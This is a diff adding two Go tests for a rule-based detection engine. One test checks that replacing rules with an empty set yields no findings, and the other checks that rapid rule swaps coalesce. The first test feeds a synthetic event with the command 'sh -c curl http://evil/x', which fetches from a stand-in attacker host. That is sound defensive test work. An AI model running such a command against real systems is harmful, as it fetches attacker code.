@@ -269,3 +269,52 @@ func TestCompileRulesRejectsUnknownCategory(t *testing.T) {
 		t.Fatalf("expected CompileRules to reject unknown category")
 	}
 }
+
+func TestReplaceRulesSwapsIndex(t *testing.T) {
+	start := compileFixture(t, curlSigma)
+	startCompiled, err := CompileRules([]*ruleast.Rule{start})
+	if err != nil {
+		t.Fatalf("CompileRules: %v", err)
+	}
+	eng := New(startCompiled, telemetry.NewCounters()).(*engine)
+
+	// Swap to an empty set via the public API. The channel is buffered so the
+	// call doesn't need the Run loop to be draining.
+	eng.ReplaceRules(nil)
+
+	in := make(chan ocsf.Event, 1)
+	in <- processActivity("/bin/sh", "sh -c curl http://evil/x")
+	close(in)
+
+	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
+	defer cancel()
+	if err := eng.Run(ctx, in); err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+
+	var findings int
+	for ev := range eng.Output() {
+		if _, ok := ev.(*ocsf.DetectionFinding); ok {
+			findings++
+		}
+	}
+	if findings != 0 {
+		t.Errorf("findings after ReplaceRules(nil) = %d, want 0", findings)
+	}
+}
+
+func TestReplaceRulesCoalescesBursts(t *testing.T) {
+	eng := New(nil, telemetry.NewCounters()).(*engine)
+	rule := compileFixture(t, curlSigma)
+	compiled, err := CompileRules([]*ruleast.Rule{rule})
+	if err != nil {
+		t.Fatalf("CompileRules: %v", err)
+	}
+	// Several back-to-back swaps shouldn't deadlock on the 1-buffered channel.
+	for i := 0; i < 10; i++ {
+		eng.ReplaceRules(compiled)
+	}
+	if got := len(eng.replace); got != 1 {
+		t.Errorf("pending replace = %d, want 1", got)
+	}
+}
